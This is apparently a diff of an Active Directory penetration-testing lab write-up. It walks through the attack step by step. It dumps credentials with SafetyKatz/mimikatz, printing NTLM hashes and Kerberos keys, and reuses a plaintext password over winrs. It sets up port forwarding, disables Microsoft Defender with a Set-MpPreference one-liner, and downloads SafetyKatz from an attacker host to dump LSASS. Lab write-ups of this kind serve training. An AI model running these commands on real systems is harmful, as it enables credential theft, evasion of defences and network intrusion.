+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : IT-SQLSRV02$
+Domain            : IT
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:31 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : it-sqlsrv02$
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(commandline) # exit</code></pre></div></details></li></ul></div><div dir="auto"><p class=""><code>C:\Loader.exe -Path </code><code><a href="http://127.0.0.1:443/SafetyKatz.exe">http://127.0.0.1:443/SafetyKatz.exe</a></code><code> -args 'sekurlsa::ekeys' 'exit'</code></p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>Credentials Dumping - sekurlsa::ekeys</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">mimikatz(commandline) # sekurlsa::ekeys
 
 Authentication Id : 0 ; 3741362 (00000000:003916b2)
 Session           : RemoteInteractive from 2
@@ -2081,19 +1547,7 @@ Domain            : NT Service
 Logon Server      : (null)
 Logon Time        : 2/15/2024 6:04:38 AM
 SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
-        msv :
-         [00000003] Primary
-         * Username : IT-SQLSRV02$
-         * Domain   : IT
-         * NTLM     : 9f781139283fa1e712e9dc349f236834
-         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
-         * DPAPI    : cc259915c10d19d876f891ac8133629a
-        tspkg :
-        wdigest :
-         * Username : IT-SQLSRV02$
-         * Domain   : IT
-         * Password : (null)
-        kerberos :
+
          * Username : IT-SQLSRV02$
          * Domain   : it.gcb.local
          * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
@@ -2104,91 +1558,303 @@ SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741
            rc4_hmac_old      9f781139283fa1e712e9dc349f236834
            rc4_md4           9f781139283fa1e712e9dc349f236834
            rc4_hmac_nt_exp   9f781139283fa1e712e9dc349f236834
-           rc4_hmac_old_exp  9f781139283fa1e712e9dc349f236834</code></pre>
-</details>
+           rc4_hmac_old_exp  9f781139283fa1e712e9dc349f236834
 
-<figure><img src="../../assets/crtm/image 72.png" alt="Credentials Dumped"/></figure>
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : IT-SQLSRV02$
+Domain            : IT
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:33 AM
+SID               : S-1-5-20
 
-<h1>Kerberos Double-Hopping and Its Issues</h1>
+         * Username : it-sqlsrv02$
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       1d31fa04eaee56d8333e435b55bc7896a453ae9c399a8073599813a42278d536
+           rc4_hmac_nt       9f781139283fa1e712e9dc349f236834
+           rc4_hmac_old      9f781139283fa1e712e9dc349f236834
+           rc4_md4           9f781139283fa1e712e9dc349f236834
+           rc4_hmac_nt_exp   9f781139283fa1e712e9dc349f236834
+           rc4_hmac_old_exp  9f781139283fa1e712e9dc349f236834
 
-<p>When I tried to import PowerShell and also ADModule</p>
+Authentication Id : 0 ; 60015 (00000000:0000ea6f)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:32 AM
+SID               : S-1-5-96-0-0
 
-<figure><img src="../../assets/crtm/image 73.png" alt="Kerberos Double Hop"/></figure>
+         * Username : IT-SQLSRV02$
+         * Domain   : it.gcb.local
+         * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
+         * Key List :
+           aes256_hmac       9f30013a970ca03227358d2fa2ab4469e60eaaf62d8181901ce9215c04f721d5
+           aes128_hmac       99c5c31679f0ac44d8e33c58b0ae831d
+           rc4_hmac_nt       9f781139283fa1e712e9dc349f236834
+           rc4_hmac_old      9f781139283fa1e712e9dc349f236834
+           rc4_md4           9f781139283fa1e712e9dc349f236834
+           rc4_hmac_nt_exp   9f781139283fa1e712e9dc349f236834
+           rc4_hmac_old_exp  9f781139283fa1e712e9dc349f236834
 
-<p><code>Import-Module C:\PowerView.ps1</code></p>
+Authentication Id : 0 ; 60024 (00000000:0000ea78)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:32 AM
+SID               : S-1-5-96-0-1
 
-<figure><img src="../../assets/crtm/image 74.png" alt="PowerView Import"/></figure>
+         * Username : IT-SQLSRV02$
+         * Domain   : it.gcb.local
+         * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
+         * Key List :
+           aes256_hmac       9f30013a970ca03227358d2fa2ab4469e60eaaf62d8181901ce9215c04f721d5
+           aes128_hmac       99c5c31679f0ac44d8e33c58b0ae831d
+           rc4_hmac_nt       9f781139283fa1e712e9dc349f236834
+           rc4_hmac_old      9f781139283fa1e712e9dc349f236834
+           rc4_md4           9f781139283fa1e712e9dc349f236834
+           rc4_hmac_nt_exp   9f781139283fa1e712e9dc349f236834
+           rc4_hmac_old_exp  9f781139283fa1e712e9dc349f236834
 
-<h2>Bypassing Kerberos Double-Hopping issue</h2>
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : IT-SQLSRV02$
+Domain            : IT
+Logon Server      : (null)
+Logon Time        : 2/15/2024 6:04:31 AM
+SID               : S-1-5-18
 
-<p><br/><code>$passwd = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force<br/>$creds = New-Object System.Management.Automation.PSCredential ("msp\mspdb", $passwd)<br/>Get-DomainComputer -Credential $creds | Select -ExpandProperty 'cn'</code></p>
+         * Username : it-sqlsrv02$
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       1d31fa04eaee56d8333e435b55bc7896a453ae9c399a8073599813a42278d536
+           rc4_hmac_nt       9f781139283fa1e712e9dc349f236834
+           rc4_hmac_old      9f781139283fa1e712e9dc349f236834
+           rc4_md4           9f781139283fa1e712e9dc349f236834
+           rc4_hmac_nt_exp   9f781139283fa1e712e9dc349f236834
+           rc4_hmac_old_exp  9f781139283fa1e712e9dc349f236834
 
-<figure><img src="../../assets/crtm/image 75.png" alt="Bypass Double Hop"/></figure>
+mimikatz(commandline) # exit</code></pre></div></details></li></ul></div><div dir="ltr"><figure class="image"><a><img style="width:1231px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h1 class="">Kerberos Double-Hoping and Its Issues</h1></div><div dir="auto"><p class="">When I tried to import PowerShell and also ADModule</p></div><div dir="ltr"><figure class="image"><a><img style="width:2106px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Import-Module C:\PowerView.ps1</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h2 class="">Bypassing Kerberos Double-Hoping issue</h2></div><div dir="auto"><p class=""><br/><code>$passwd = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force<br/>$creds = New-Object System.Management.Automation.PSCredential ("msp\mspdb", $passwd)<br/>Get-DomainComputer -Credential $creds | Select -ExpandProperty 'cn'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h1 class="">Accessing MSP-SRV01 Via WinRS</h1></div><div dir="auto"><p class=""><code>Import-Module .\PowerView.ps1</code></p></div><div dir="auto"><p class=""><code>$passwd = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force<br/>$creds = New-Object System.Management.Automation.PSCredential ("msp\mspdb", $passwd)<br/>Get-ADComputer -Credential $creds</code></p></div><div dir="auto"><p class=""><code>Find-LocalAdminAccess -Credential $creds</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.933349609375px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>Output</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">DNSHostName        : msp-dc01.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : MSP-DC01$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1000
+DistinguishedName  : CN=MSP-DC01,OU=Domain Controllers,DC=msp,DC=local
+Name               : MSP-DC01
+ObjectClass        : computer
+ObjectGuid         : 89698777-a674-459d-94e4-33db0942afab
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<h1>Accessing MSP-SRV01 Via WinRS</h1>
+DNSHostName        : msp-sqlreport.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : MSP-SQLREPORT$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1104
+DistinguishedName  : CN=MSP-SQLREPORT,CN=Computers,DC=msp,DC=local
+Name               : MSP-SQLREPORT
+ObjectClass        : computer
+ObjectGuid         : eb967b14-aeab-4edc-8655-0e56d85bbfbd
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<p><code>Import-Module .\PowerView.ps1</code></p>
+DNSHostName        : msp-srv01.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : MSP-SRV01$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1105
+DistinguishedName  : CN=MSP-SRV01,CN=Computers,DC=msp,DC=local
+Name               : MSP-SRV01
+ObjectClass        : computer
+ObjectGuid         : 27990b25-93a9-4186-b9b5-c2311f853427
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<p><code>$passwd = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force<br/>$creds = New-Object System.Management.Automation.PSCredential ("msp\mspdb", $passwd)<br/>Get-ADComputer -Credential $creds</code></p>
+DNSHostName        : msp-report08.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : msp-report08$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1820
+DistinguishedName  : CN=msp-report08,CN=Computers,DC=msp,DC=local
+Name               : msp-report08
+ObjectClass        : computer
+ObjectGuid         : 817cf0a4-0add-4fbf-be19-d10ff27ce15d
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<p><code>Find-LocalAdminAccess -Credential $creds</code></p>
+DNSHostName        : msp-san07.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : msp-san07$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1821
+DistinguishedName  : CN=msp-san07,CN=Computers,DC=msp,DC=local
+Name               : msp-san07
+ObjectClass        : computer
+ObjectGuid         : 91934177-5540-433c-a26d-0ccffb2fce35
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<figure><img src="../../assets/crtm/image 76.png" alt="Local Admin Access"/></figure>
+DNSHostName        : msp-srv08.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : msp-srv08$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1822
+DistinguishedName  : CN=msp-srv08,CN=Computers,DC=msp,DC=local
+Name               : msp-srv08
+ObjectClass        : computer
+ObjectGuid         : 61dc2a8a-22ab-4052-975b-86d175727c0d
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<p>If we simply try to access MSP-SRV01 straightforward we will face the following issue blow.</p>
+DNSHostName        : msp-srv04.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : msp-srv04$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1823
+DistinguishedName  : CN=msp-srv04,CN=Computers,DC=msp,DC=local
+Name               : msp-srv04
+ObjectClass        : computer
+ObjectGuid         : 2b1074b6-9bb3-41ee-8ee6-eaff8887f2ca
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<p><code>winrs -r:MSP-SRV01.MSP.LOCAL cmd</code></p>
+DNSHostName        : msp-data09.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : msp-data09$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1824
+DistinguishedName  : CN=msp-data09,CN=Computers,DC=msp,DC=local
+Name               : msp-data09
+ObjectClass        : computer
+ObjectGuid         : 62c73020-137a-4171-9ce8-f6a19ca9000f
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<figure><img src="../../assets/crtm/image 77.png" alt="WinRS Error MSP-SRV01"/></figure>
+DNSHostName        : msp-web06.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : msp-web06$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1825
+DistinguishedName  : CN=msp-web06,CN=Computers,DC=msp,DC=local
+Name               : msp-web06
+ObjectClass        : computer
+ObjectGuid         : 52d2b63d-a71d-4e57-b978-89d3a8bf4c68
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<p>Once again, we face this issue because of Kerberos Double-Hopping. So we need to specify the mspdb credentials to be able to login.
-Now, the next issue we face is the issue that we have faced several times before, related to WinRM permissions and we already know the bypass for that.</p>
+DNSHostName        : msp-dc07.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : msp-dc07$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1826
+DistinguishedName  : CN=msp-dc07,CN=Computers,DC=msp,DC=local
+Name               : msp-dc07
+ObjectClass        : computer
+ObjectGuid         : 57a49f35-bb6f-4d03-b77e-d57d1f8fba84
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<p><code>winrs -r:MSP-SRV01.msp.local -u:"msp\mspdb" -p:"Vend0r'sDatabaseSecret" cmd</code></p>
+DNSHostName        : msp-data04.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : msp-data04$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1827
+DistinguishedName  : CN=msp-data04,CN=Computers,DC=msp,DC=local
+Name               : msp-data04
+ObjectClass        : computer
+ObjectGuid         : af60227c-f1da-4091-a178-c66d787f94c1
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<figure><img src="../../assets/crtm/image 78.png" alt="WinRS Access MSP-SRV01"/></figure>
+DNSHostName        : msp-report05.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : msp-report05$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1828
+DistinguishedName  : CN=msp-report05,CN=Computers,DC=msp,DC=local
+Name               : msp-report05
+ObjectClass        : computer
+ObjectGuid         : c572bc11-a37b-476b-918f-16d8a8da21bf
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9
 
-<h3>PSWA - Powershell Web Access</h3>
-
-<p>Now that we are inside MSP-SRV01, We found that this server is hosting a Web Service, and we can discover this by issuing the command <code><strong>Get-WebApplication</strong></code>.
-<code>Get-WebApplication</code></p>
-
-<figure><img src="../../assets/crtm/image 82.png" alt="Web Application"/></figure>
-
-<p>As we can see above, we have the prove that a Web service is running on the server with an application pull named <code><strong>pswa_pool</strong></code> and it is using HTTP Protocol.
-This is <strong>PowerShell Web Access (PSWA)</strong> a feature that exposes a <strong>PowerShell session via browser</strong> (RDP-for-PowerShell).</p>
-
-<h3>Enumerating Open Ports</h3>
-
-<p><code>netstat -ano | findstr "LISTENING"</code></p>
-
-<figure><img src="../../assets/crtm/image 83.png" alt="Open Ports"/></figure>
-
-<p>OK OK OK... normally PowerShell Web Access runs on TCP/443. Because we are not able to access MSP.LOCAL doomain from our Employee workstation, we need to do a port forwarding from MSP-SQLREPORT pointing all traffic coming from any source IP on port 443 to be forwarded to to MSP-SRV01 on Port 443.</p>
-
-<p><code>netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.250.22</code></p>
-
-<p><code>netsh interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 connectport=443 connectaddress=192.168.250.22</code></p>
-
-<figure><img src="../../assets/crtm/image 84.png" alt="Port Forwarding MSP-SRV01"/></figure>
-
-<p>After doing this port forwarding on MSP-SQLREPORT, we are able the Powershell Web Access service.</p>
-
-<figure><img src="../../assets/crtm/image 86.png" alt="PSWA Access"/></figure>
-
-<p>Disable MSP-SRV01 Firewalls</p>
-
-<p><code>Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -Disable ScriptScanning 1; Set-MpPreference -DisableIntrusionPreventionSystem 1; Set-MpPreference -DisableNetworkProtection 1; Set-MpPreference -SubmitSamplesConsent 2; Set-MpPreference -MAPSReporting 0; Set-MpPreference -PUAProtection 0</code></p>
-
-<p>Now Upload SafetyKatz to dump LSASS credentials</p>
-
-<p><code>Invoke-WebRequest -Uri http://192.168.100.41:443/SafetyKatz.exe -OutFile 'C:\SafetyKatz.exe' -UseBasicParsing</code></p>
-
-<p><code>C:\SafetyKatz.exe "sekurlsa::logonpasswords /patch" "exit"</code></p>
-
-<details class="toggle">
-<summary><strong>logonpasswords</strong></summary>
-<pre><code>mimikatz(commandline) # sekurlsa::logonpasswords /patch
+DNSHostName        : msp-dc08.msp.local
+UserPrincipalName  :
+Enabled            : True
+SamAccountName     : msp-dc08$
+SID                : S-1-5-21-2998733414-582960673-4099777928-1829
+DistinguishedName  : CN=msp-dc08,CN=Computers,DC=msp,DC=local
+Name               : msp-dc08
+ObjectClass        : computer
+ObjectGuid         : 9438bc05-d90d-4e37-bde1-58f9779e857f
+PropertyNames      : {DistinguishedName, DNSHostName, Enabled, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 9</code></pre></div></details></li></ul></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">If we simply try to access MSP-SRV01 straightforward we will face the following issue blow.</p></div><div dir="auto"><p class=""><code>winrs -r:MSP-SRV01.MSP.LOCAL cmd</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2080px"/></a></figure></div><div dir="auto"><p class="">Once again, we face this issue because of Kerberos Double-Hoping. So we need to specify the mspdb credentials to be able to login.<br/>Now, the next issue we face is the issue that we have faced several times before, related to WinRM permissions and we already know the bypass for that.</p></div><div dir="auto"><p class=""><code>winrs -r:MSP-SRV01.msp.local -u:"msp\mspdb" -p:"Vend0r'sDatabaseSecret" cmd</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2519px"/></a></figure></div><div dir="auto"><p class="">We can execute the following command:<br/><strong>CMDLet:</strong></p></div><div dir="auto"><p class=""><code>winrm set winrm/config/client @{TrustedHosts="MSP-SRV01.msp.local"}</code></p></div><div dir="auto"><p class=""><strong>PowerShell:</strong></p></div><div dir="auto"><p class=""><code>Set-Item WSMan:\localhost\Client\TrustedHosts -Value "MSP-SQLREPORT.msp.local" -Force</code></p></div><div dir="auto"><p class="">I executed in CMDLet and that’s what we get as output.</p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">Now we can go ahead and try to login again.</p></div><div dir="auto"><p class=""><code>winrs -r:MSP-SRV01.ms</code></p></div><div dir="auto"><p class=""><code>p.local -u:"msp\mspdb" -p:"Vend0r'sDatabaseSecret" cmd</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2313px"/></a></figure></div><div dir="auto"><p class="">Voilá, we are inside MSP-SRV01 server.</p></div><div dir="auto"><p class=""><code>ipconfig /all</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2191px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">PSWA - Powershell Web Access </h3></div><div dir="auto"><p class="">Now that we are inside MSP-SRV01, We found that this server is hosting a Web Service, and we can discover this by issuing the command <code><strong>Get-WebApplication</strong></code>.<br/><code>Get-WebApplication</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2137px"/></a></figure></div><div dir="auto"><p class="">As we can see above, we have the prove that a Web service is running on the server with an application pull named <code><strong>pswa_pool</strong></code> and it is using HTTP Protocol.<br/>This is <strong>PowerShell Web Access (PSWA) </strong>a feature that exposes a <strong>PowerShell session via browser</strong> (RDP-for-PowerShell).</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">Enumerating Open Ports</h3></div><div dir="auto"><p class=""><code>netstat -ano | findstr "LISTENING”</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2089px"/></a></figure></div><div dir="auto"><p class="">OK OK OK… normally PowerShell Web Access runs on TCP/443. Because we are not able to access MSP.LOCAL doomain from our Employee workstation, we need to do a port forwarding from MSP-SQLREPORT pointing all traffic coming from any source IP on port 443 to be forwarded to to MSP-SRV01 on Port 443.</p></div><div dir="auto"><p class=""><code>netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.250.22</code></p></div><div dir="auto"><p class=""><code>netsh interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 connectport=443 connectaddress=192.168.250.22</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:2388px"/></a></figure></div><div dir="auto"><p class="">After doing this port forwarding on MSP-SQLREPORT, we are able the Powershell Web Access service.</p></div><div dir="ltr"><figure class="image"><a><img style="width:2551px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="ltr"><figure class="image"><a><img style="width:2538px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Disable MSP-SRV01 Firewalls</p></div><div dir="auto"><p class=""><code>Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -Disable ScriptScanning 1; Set-MpPreference -DisableIntrusionPreventionSystem 1; Set-MpPreference -DisableNetworkProtection 1; Set-MpPreference -SubmitSamplesConsent 2; Set-MpPreference -MAPSReporting 0; Set-MpPreference -PUAProtection 0</code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Now Upload SafetyKatz to dump LSASS credentials</p></div><div dir="auto"><p class=""><code>Invoke-WebRequest -Uri </code><code><a href="http://192.168.100.41:443/SafetyKatz.exe">http://192.168.100.41:443/SafetyKatz.exe</a></code><code> -OutFile 'C:\SafetyKatz.exe' -UseBasicParsing</code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>C:\SafetyKatz.exe "sekurlsa::logonPasswords /patch" "exit"</code></p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>logonpasswords</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">mimikatz(commandline) # sekurlsa::logonPasswords /patch
  
 Authentication Id : 0 ; 4848344 (00000000:0049fad8)
 Session           : Service from 0
@@ -2213,12 +1879,12 @@ SID               : S-1-5-82-2883991969-2481503881-2978453264-941640394-36149096
 	 * Username : MSP-SRV01$
 	 * Domain   : msp.local
 	 * Password : 73 de e3 e9 b3 aa 2b e0 bf 4e 99 59 ce e2 55 4a 3e 0c 98 db e0 fc 4e e7 a6 80 9a b9 4a 75 c6 c4 a
- 5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 
- 8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e
-  5c 2e e1 5d 1f 8b 28 27 3a cb 0c cb 37 40 b9 42 a3 c1 30 0c 7b ca cd 3a bd fb f2 64 1a df 80 e2 e2 bf 3e e2 92 52 e0 b
- e ac 10 11 a4 eb ec 46 fb 1c 0f 97 66 84 b2 94 fa 33 da 68 74 d4 c6 39 3c e7 c4 09 85 d2 d2 9e 7d 8b b0 b4 2f 15 df e5 
- 41 39 7e 7a ef e6 cb cb fb 8d bb d6 1a 9e e8 f8 64 c2 38 0c f2 27 8c 2b 69 56 62 ed c1 19 46 2a 69 58 8c 2c 6b d2 1c ba
-  6b 93 68 06 ee 81 80 71 20 
+5 1d 4c 95 fe 11 e0 9c 0d 3a 6e 8e 55 a7 ca 87 55 8a c8 7e 95 c7 96 07 25 a4 8d 6d bf d8 9d cf 10 8b 8b 1a 94 88 98 2a 
+8d 60 e5 4b 76 45 21 fb e9 79 9a 91 9e 60 10 20 74 f2 5f cb 81 9f f0 1e de f7 af 0c e5 5b 2c bf a9 47 19 fd 67 c7 4c 0e
